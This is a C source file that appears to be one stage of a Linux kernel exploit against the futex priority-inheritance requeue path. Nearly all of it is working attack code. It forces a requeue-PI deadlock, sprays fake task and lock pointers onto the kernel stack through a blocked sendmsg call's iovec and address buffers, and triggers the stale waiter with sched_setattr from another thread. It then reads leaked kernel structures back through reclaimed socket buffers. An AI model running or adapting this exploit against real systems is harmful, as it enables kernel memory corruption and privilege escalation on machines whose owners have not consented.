#include "common.h"

#define S2_WAIT_SECONDS 5
#define S2_ARM_DELAY_MS 150
#define S2_PUNCH_DELAY_MS 150
#define S2_CONSUMER_WAIT_MS 10000
#define S2_UNBLOCK_AFTER_MS 1000
#define S2_WATCHDOG_TIMEOUT_MS 45000
#define S2_IOV_TOTAL 0x10004u
#define S2_SENDMSG_PENDING (-2)

static uint32_t s2_f_wait;
static uint32_t s2_f_pi_target;
static uint32_t s2_f_pi_chain;
static int s2_sender_fd = -1;
static int s2_peer_fd = -1;
static pthread_t s2_consumer_handle;
static atomic_int s2_waiter_ready;
static atomic_int s2_waiter_waiting;
static atomic_int s2_owner_started;
static atomic_int s2_owner_chain_done;
static atomic_int s2_owner_stop;
static atomic_int s2_route_done;
static atomic_int s2_waiter_tid;
static volatile atomic_int s2_go;
static volatile atomic_int s2_requeue_complete;
static volatile atomic_int s2_sendmsg_armed;
static volatile atomic_int s2_punch_allowed;
static volatile atomic_int s2_punch_calls;
static volatile atomic_int s2_punch_success;
static volatile atomic_int s2_punch_inflight;
static volatile atomic_int s2_sendmsg_ret;
static volatile atomic_int s2_sendmsg_errno;
static volatile atomic_int s2_futex_ret;
static volatile atomic_int s2_futex_errno;
static volatile atomic_int s2_requeue_ret;
static volatile atomic_int s2_requeue_errno;

static void s2_msleep(int ms) {
  struct timespec ts = {
    .tv_sec = ms / 1000,
    .tv_nsec = (long)(ms % 1000) * 1000000L,
  };
  nanosleep(&ts, NULL);
}

static void s2_log_verdict(int pass, const char *reason) {
  pr_info("H1A-S2 verdict=%s reason=%s\n", pass ? "PASS" : "FAIL", reason);
}

__attribute__((noinline)) static int s2_carrier_contract_ok(
    const struct iovec *iov, const struct msghdr *mh,
    const unsigned char *name) {
  if (!iov || !name || mh->msg_name != name || mh->msg_namelen != 32 ||
      mh->msg_iov != iov ||
      mh->msg_iovlen != 8 || mh->msg_control != NULL ||
      mh->msg_controllen != 0 || mh->msg_flags != 0) {
    return 0;
  }
  if (!iov[0].iov_base || iov[0].iov_len != 0x10000) return 0;
  for (int i = 1; i <= 4; ++i) {
    if (!iov[i].iov_base || iov[i].iov_len != 1) return 0;
  }
  for (int i = 5; i <= 7; ++i) {
    if (iov[i].iov_base != NULL || iov[i].iov_len != 0) return 0;
  }
  uint64_t total_len = 0;
  for (int i = 0; i < 8; ++i) {
    total_len += iov[i].iov_len;
  }
  if (total_len != (uint64_t)S2_IOV_TOTAL) return 0;

  unsigned char expect[32];
  memset(expect, 0, sizeof(expect));
  memcpy(expect + 0x00, &fake_task, sizeof(fake_task));
  memcpy(expect + 0x08, &fake_lock, sizeof(fake_lock));
  uint32_t prio = 130;
  memcpy(expect + 0x10, &prio, sizeof(prio));
  return memcmp(name, expect, sizeof(expect)) == 0;
}

static long s2_sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_OTHER;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

static int s2_tcp_gate(void) {
  int fds[2] = {-1, -1};
  uint32_t sndbuf = 0;
  socklen_t optlen = sizeof(sndbuf);
  int enabled = 1;

  if (socketpair(AF_INET, SOCK_STREAM, 0, fds) != 0) {
    pr_error("S2 tcp socketpair errno=%d\n", errno);
    return 0;
  }

  uint32_t want_sndbuf = 262144;
  if (setsockopt(fds[0], SOL_SOCKET, SO_SNDBUF,
                 &want_sndbuf, sizeof(want_sndbuf)) != 0 ||
      setsockopt(fds[0], IPPROTO_TCP, TCP_NODELAY,
                 &enabled, sizeof(enabled)) != 0 ||
      getsockopt(fds[0], SOL_SOCKET, SO_SNDBUF,
                 &sndbuf, &optlen) != 0) {
    pr_error("S2 tcp options errno=%d\n", errno);
    goto fail;
  }

  int old_flags = fcntl(fds[0], F_GETFL, 0);
  if (old_flags < 0 ||
      fcntl(fds[0], F_SETFL, old_flags | O_NONBLOCK) < 0) {
    pr_error("S2 tcp nonblock errno=%d\n", errno);
    goto fail;
  }

  static unsigned char fill_buf[0x10000];
  memset(fill_buf, 0x53, sizeof(fill_buf));
  struct iovec fill_iov = {
    .iov_base = fill_buf,
    .iov_len = sizeof(fill_buf),
  };
  struct msghdr fill_msg;
  memset(&fill_msg, 0, sizeof(fill_msg));
  fill_msg.msg_iov = &fill_iov;
  fill_msg.msg_iovlen = 1;
  for (;;) {
    errno = 0;
    ssize_t sent = sendmsg(fds[0], &fill_msg, MSG_NOSIGNAL);
    if (sent > 0) {
      continue;
    }
    if (errno == EAGAIN || errno == EWOULDBLOCK) {
      break;
    }
    pr_error("S2 tcp fill errno=%d\n", errno);
    goto fail;
  }

  if (fcntl(fds[0], F_SETFL, old_flags) < 0) {
    pr_error("S2 tcp restore errno=%d\n", errno);
    goto fail;
  }

  uint32_t outq = 0;
  if (ioctl(fds[0], SIOCOUTQ, &outq) != 0) {
    pr_error("S2 tcp SIOCOUTQ errno=%d\n", errno);
    goto fail;
  }
  uint32_t effective = sndbuf / 2;
  uint32_t required = effective > 4096 ? effective - 4096 : 0;
  pr_info("H1A-S2 tcp sndbuf=%u effective=%u outq=%u gate=%s\n",
          sndbuf, effective, outq,
          (outq > 0 && outq >= required) ? "PASS" : "FAIL");
  if (outq == 0 || outq < required) {
    goto fail;
  }

  s2_sender_fd = fds[0];
  s2_peer_fd = fds[1];
  return 1;

fail:
  if (fds[0] >= 0) close(fds[0]);
  if (fds[1] >= 0) close(fds[1]);
  return 0;
}

static pid_t s2_start_watchdog(int *parent_fd) {
  int pfd[2] = {-1, -1};
  pid_t parent_pid = getpid();

  if (pipe(pfd) != 0) {
    pr_error("S2 watchdog pipe errno=%d\n", errno);
    return -1;
  }
  pid_t pid = fork();
  if (pid < 0) {
    pr_error("S2 watchdog fork errno=%d\n", errno);
    close(pfd[0]);
    close(pfd[1]);
    return -1;
  }
  if (pid == 0) {
    close(pfd[1]);
    ks_relocate_fd_min(&pfd[0], KS_FD_PROTECT_MIN);
    s2_msleep(S2_WATCHDOG_TIMEOUT_MS);
    pr_warning("H1A-S2 watchdog timeout parent=%d status=stuck\n",
               parent_pid);
    kill(parent_pid, SIGKILL);
    _exit(2);
  }

  pr_info("H1A-S2 watchdog started pid=%d parent=%d timeout_ms=%d\n",
          pid, parent_pid, S2_WATCHDOG_TIMEOUT_MS);
  close(pfd[0]);
  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
  if (parent_fd) {
    *parent_fd = pfd[1];
  }
  return pid;
}

static void s2_finish_watchdog(pid_t pid, int parent_fd) {
  if (pid < 0) {
    return;
  }
  if (parent_fd >= 0) {
    char one = 1;
    ssize_t ignored = write(parent_fd, &one, sizeof(one));
    (void)ignored;
    close(parent_fd);
  }
  kill(pid, SIGKILL);
  int status = 0;
  waitpid(pid, &status, 0);
}

static void s2_readback_evidence(void) {
  static unsigned char rbuf[SKB_SEND_SIZE];
  struct iovec iov = { rbuf, sizeof(rbuf) };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;
  const size_t bias = (size_t)SKB_FRAG_BIAS;

  for (int i = 0; i < SKB_RECLAIM_SENDS; ++i) {
    errno = 0;
    ssize_t n = recvmsg(s2_reclaim_fd(), &msg, MSG_DONTWAIT);
    if (n <= 0) {
      break;
    }
    size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
    if (check < bias + (size_t)FAKE_TASK_OFF + 0x8e0) {
      continue;
    }
    uint64_t proxy_lock_pc = 0;
    uint64_t proxy_lock_right = 0;
    uint64_t proxy_lock_left = 0;
    uint64_t proxy_pi_pc = 0;
    uint64_t proxy_pi_right = 0;
    uint64_t proxy_pi_left = 0;
    uint64_t ft_root = 0;
    uint64_t lock_wait_lock = 0;
    uint64_t lock_owner = 0;
    memcpy(&proxy_lock_pc, rbuf + bias + W0_OFF + 0x00,
           sizeof(proxy_lock_pc));
    memcpy(&proxy_lock_right, rbuf + bias + W0_OFF + 0x08,
           sizeof(proxy_lock_right));
    memcpy(&proxy_lock_left, rbuf + bias + W0_OFF + 0x10,
           sizeof(proxy_lock_left));
    memcpy(&proxy_pi_pc, rbuf + bias + W0_OFF + 0x18, sizeof(proxy_pi_pc));
    memcpy(&proxy_pi_right, rbuf + bias + W0_OFF + 0x20,
           sizeof(proxy_pi_right));
    memcpy(&proxy_pi_left, rbuf + bias + W0_OFF + 0x28,
           sizeof(proxy_pi_left));
    memcpy(&ft_root, rbuf + bias + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
           sizeof(ft_root));
    memcpy(&lock_wait_lock, rbuf + bias + LOCK_OFF, sizeof(lock_wait_lock));
    memcpy(&lock_owner, rbuf + bias + LOCK_OFF + 0x18, sizeof(lock_owner));
    pr_info("H1A-S2 readback proxy_tree_self=%d proxy_pi_self=%d "
            "ft_pi_root=%016llx\n",
            proxy_lock_pc == 1 && proxy_lock_right == 0 &&
              proxy_lock_left == 0,
            proxy_pi_pc == 1 && proxy_pi_right == 0 &&
              proxy_pi_left == 0,
            (unsigned long long)ft_root);
    pr_info("H1A-S2 evidence lock_wait_lock=%016llx lock_owner=%016llx "
            "ft_root_plausible=%d\n",
            (unsigned long long)lock_wait_lock,
            (unsigned long long)lock_owner,
            (ft_root & 0xffff000000000000ULL) == 0xffff000000000000ULL);
    return;
  }
  pr_warning("H1A-S2 readback missing\n");
}

static void *s2_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CORE);

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&s2_waiter_tid, tid);
  if (futex_op(&s2_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("S2 waiter lock chain errno=%d\n", errno);
    atomic_store(&s2_route_done, 1);
    return NULL;
  }
  atomic_store(&s2_waiter_ready, 1);
  while (!atomic_load(&s2_owner_started)) {
    s2_msleep(1);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += S2_WAIT_SECONDS;
  atomic_store(&s2_waiter_waiting, 1);
  errno = 0;
  int ret = futex_op(&s2_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                     &s2_f_pi_target, 0);
  int saved_errno = errno;
  atomic_store(&s2_futex_ret, ret);
  atomic_store(&s2_futex_errno, saved_errno);

  /* No log or socket operation here: preserve the sendmsg stack window. */
  if (ret != -1 || saved_errno != ETIMEDOUT) {
    atomic_store(&s2_punch_allowed, 0);
    atomic_store(&s2_route_done, 1);
    return NULL;
  }

  /* The sendmsg stack shape is usable only after CMP_REQUEUE_PI has fully
   * returned; s2_go deliberately starts after that handshake. */
  while (!atomic_load(&s2_requeue_complete)) {
    __asm__ volatile("yield" ::: "memory");
  }
  unsigned char name[128];
  memset(name, 0, sizeof(name));
  memcpy(name + 0x00, &fake_task, sizeof(fake_task));
  memcpy(name + 0x08, &fake_lock, sizeof(fake_lock));
  uint32_t sw_prio = 130;
  memcpy(name + 0x10, &sw_prio, sizeof(sw_prio));

  struct iovec iov[8];
  memset(iov, 0, sizeof(iov));
  static unsigned char payload[0x10000];
  memset(payload, 0x41, sizeof(payload));
  iov[0].iov_base = payload;
  iov[0].iov_len = 0x10000;
  for (int i = 1; i <= 4; ++i) {
    iov[i].iov_base = payload;
    iov[i].iov_len = 1;
  }
  /* iov[5..7] stay exactly {NULL, 0}: these become SW's childless red
   * rbtree words.  Any nonzero base would be a non-NULL child pointer. */

  struct msghdr mh;
  memset(&mh, 0, sizeof(mh));
  mh.msg_name = name;
  mh.msg_namelen = 32;
  mh.msg_iov = iov;
  mh.msg_iovlen = 8;
  mh.msg_control = NULL;
  mh.msg_controllen = 0;
  mh.msg_flags = 0;

  if (!s2_carrier_contract_ok(iov, &mh, name)) {
    atomic_store(&s2_punch_allowed, 0);
    atomic_store(&s2_sendmsg_armed, 0);
    atomic_store(&s2_route_done, 1);
    pr_error("S2 carrier contract failed\n");
    return NULL;
  }

  pr_info("H1A-S2 sendmsg armed tid=%d iov_total=%u delay_ms=%d\n",
          tid, S2_IOV_TOTAL, S2_ARM_DELAY_MS);
  if (!atomic_load(&s2_punch_allowed) ||
      atomic_load(&s2_sendmsg_ret) != S2_SENDMSG_PENDING) {
    atomic_store(&s2_punch_allowed, 0);
    atomic_store(&s2_sendmsg_armed, 0);
    atomic_store(&s2_route_done, 1);
    pr_warning("S2 sendmsg arm gate failed\n");
    return NULL;
  }
  s2_msleep(S2_ARM_DELAY_MS);
  atomic_store(&s2_punch_allowed, 1);
  /* s2_sendmsg_armed is the final release signal: keep it immediately
   * before the syscall so the consumer cannot enter the sendmsg stack
   * window while the victim is still in logging or validation code. */
  atomic_store(&s2_sendmsg_armed, 1);
  errno = 0;
  ret = (int)sendmsg(s2_sender_fd, &mh, MSG_NOSIGNAL);
  saved_errno = errno;
  atomic_store(&s2_sendmsg_ret, ret);
  atomic_store(&s2_sendmsg_errno, saved_errno);
  atomic_store(&s2_route_done, 1);
  pr_info("H1A-S2 sendmsg returned ret=%d errno=%d\n", ret, saved_errno);

  if (atomic_load(&s2_punch_success) == 1) {
    futex_op(&s2_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  }
  return NULL;
}

static void *s2_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (futex_op(&s2_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("S2 owner lock target errno=%d\n", errno);
    atomic_store(&s2_owner_chain_done, 1);
    atomic_store(&s2_owner_stop, 1);
    return NULL;
  }
  while (!atomic_load(&s2_waiter_ready)) {
    s2_msleep(1);
  }
  atomic_store(&s2_owner_started, 1);
  if (futex_op(&s2_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("S2 owner lock chain errno=%d\n", errno);
    atomic_store(&s2_owner_chain_done, 1);
    atomic_store(&s2_owner_stop, 1);
    return NULL;
  }
  while (!atomic_load(&s2_owner_stop)) {
    s2_msleep(20);
  }
  futex_op(&s2_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  futex_op(&s2_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&s2_owner_chain_done, 1);
  return NULL;
}

static void *s2_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  while (!atomic_load(&s2_go)) {
    __asm__ volatile("yield" ::: "memory");
  }
  atomic_store(&s2_go, 0);
  s2_msleep(S2_PUNCH_DELAY_MS);
  int waited_ms = 0;
  while (waited_ms < S2_CONSUMER_WAIT_MS) {
    if (atomic_load(&s2_sendmsg_ret) != S2_SENDMSG_PENDING ||
        atomic_load(&s2_route_done)) {
      pr_warning("S2 consumer sendmsg returned early "
                 "armed=%d allowed=%d ret=%d route_done=%d\n",
                 atomic_load(&s2_sendmsg_armed),
                 atomic_load(&s2_punch_allowed),
                 atomic_load(&s2_sendmsg_ret),
                 atomic_load(&s2_route_done));
      return NULL;
    }
    if (atomic_load(&s2_sendmsg_armed) &&
        atomic_load(&s2_punch_allowed)) {
      break;
    }
    s2_msleep(1);
    ++waited_ms;
  }
  int tid = atomic_load(&s2_waiter_tid);
  if (!atomic_load(&s2_sendmsg_armed) ||
      !atomic_load(&s2_punch_allowed) ||
      atomic_load(&s2_sendmsg_ret) != S2_SENDMSG_PENDING) {
    pr_warning("S2 consumer punch denied armed=%d allowed=%d\n",
               atomic_load(&s2_sendmsg_armed),
               atomic_load(&s2_punch_allowed));
    return NULL;
  }

  atomic_store(&s2_punch_inflight, 1);
  atomic_store(&s2_punch_calls, 1);
  pr_info("H1A-S2 punch enter tid=%d nice=1\n", tid);
  errno = 0;
  long sched_ret = s2_sched_setattr_tid(tid, 1);
  int sched_errno = errno;
  pr_info("H1A-S2 punch first ret=%ld errno=%d\n", sched_ret, sched_errno);
  if (sched_ret == 0) {
    atomic_store(&s2_punch_success, 1);
  }
  atomic_store(&s2_punch_inflight, 0);
  pr_info("H1A-S2 punch done tid=%d ret=%ld errno=%d\n",
          tid, sched_ret, sched_errno);
  return NULL;
}

int slide_h1a_s2_test(void) {
  pid_t watchdog_pid = -1;
  int watchdog_pipe = -1;
  int result = 3;

  pr_info("H1A-S2 header route=sendmsg proxy-root=1 cfi=disabled\n");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_S2);
  if (!page_base || !fake_lock || !fake_w0 || !fake_task ||
      !s2_payload_contract_ok()) {
    s2_log_verdict(0, "payload-contract");
    return 2;
  }
  pr_info("H1A-S2 page prepared base=%016zx lock=%016zx proxy=%016zx "
          "task=%016zx\n", page_base, fake_lock, fake_w0, fake_task);

  if (!s2_tcp_gate()) {
    s2_log_verdict(0, "tcp-gate");
    return 2;
  }

  s2_f_wait = 0;
  s2_f_pi_target = 0;
  s2_f_pi_chain = 0;
  atomic_store(&s2_waiter_ready, 0);
  atomic_store(&s2_waiter_waiting, 0);
  atomic_store(&s2_owner_started, 0);
  atomic_store(&s2_owner_chain_done, 0);
  atomic_store(&s2_owner_stop, 0);
  atomic_store(&s2_route_done, 0);
  atomic_store(&s2_waiter_tid, 0);
  atomic_store(&s2_go, 0);
  atomic_store(&s2_requeue_complete, 0);
  atomic_store(&s2_sendmsg_armed, 0);
  atomic_store(&s2_punch_allowed, 0);
  atomic_store(&s2_punch_calls, 0);
  atomic_store(&s2_punch_success, 0);
  atomic_store(&s2_punch_inflight, 0);
  atomic_store(&s2_sendmsg_ret, S2_SENDMSG_PENDING);
  atomic_store(&s2_sendmsg_errno, 0);
  atomic_store(&s2_futex_ret, 0);
  atomic_store(&s2_futex_errno, 0);
  atomic_store(&s2_requeue_ret, 0);
  atomic_store(&s2_requeue_errno, 0);

  watchdog_pid = s2_start_watchdog(&watchdog_pipe);
  if (watchdog_pid < 0) {
    s2_log_verdict(0, "watchdog");
    return 2;
  }

  pthread_t waiter;
  pthread_t owner;
  SYSCHK(pthread_create(&waiter, NULL, s2_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, s2_owner_thread, NULL));
  SYSCHK(pthread_create(&s2_consumer_handle, NULL, s2_consumer_thread, NULL));

  while (!atomic_load(&s2_waiter_waiting) ||
         !atomic_load(&s2_owner_started)) {
    s2_msleep(1);
  }
  s2_msleep(100);
  errno = 0;
  int requeue_ret = futex_op(&s2_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                             (void *)1, &s2_f_pi_target, 0);
  int requeue_errno = errno;
  atomic_store(&s2_requeue_ret, requeue_ret);
  atomic_store(&s2_requeue_errno, requeue_errno);
  atomic_store(&s2_requeue_complete, 1);
  atomic_store(&s2_go, 1);

  pthread_join(s2_consumer_handle, NULL);
  if (s2_peer_fd >= 0) {
    s2_msleep(S2_UNBLOCK_AFTER_MS);
    unsigned char one = 0;
    ssize_t ignored = read(s2_peer_fd, &one, sizeof(one));
    (void)ignored;
  }
  while (!atomic_load(&s2_route_done)) {
    s2_msleep(10);
  }

  int futex_ret = atomic_load(&s2_futex_ret);
  int futex_errno = atomic_load(&s2_futex_errno);
  pr_info("H1A-S2 gate requeue ret=%d errno=%d victim ret=%d errno=%d\n",
          requeue_ret, requeue_errno, futex_ret, futex_errno);

  int gate_ok = requeue_ret == -1 && requeue_errno == EDEADLK &&
                futex_ret == -1 && futex_errno == ETIMEDOUT;
  int punch_ok = atomic_load(&s2_punch_calls) == 1 &&
                 atomic_load(&s2_punch_success) == 1;
  if (gate_ok && punch_ok) {
    s2_readback_evidence();
    result = 0;
  } else {
    result = 3;
  }

  atomic_store(&s2_owner_stop, 1);
  pthread_join(waiter, NULL);
  if (punch_ok) {
    pthread_join(owner, NULL);
  } else {
    /* Do not unlock a possibly bad PI state on failure; detached cleanup
     * is safe only because the process exits immediately below. */
    pthread_detach(owner);
  }
  if (s2_sender_fd >= 0) close(s2_sender_fd);
  if (s2_peer_fd >= 0) close(s2_peer_fd);
  s2_sender_fd = s2_peer_fd = -1;
  s2_finish_watchdog(watchdog_pid, watchdog_pipe);
  s2_log_verdict(result == 0,
                 result == 0 ? "gate-pass" :
                 (!gate_ok ? "stale-gate" : "punch-gate"));
  return result;
}
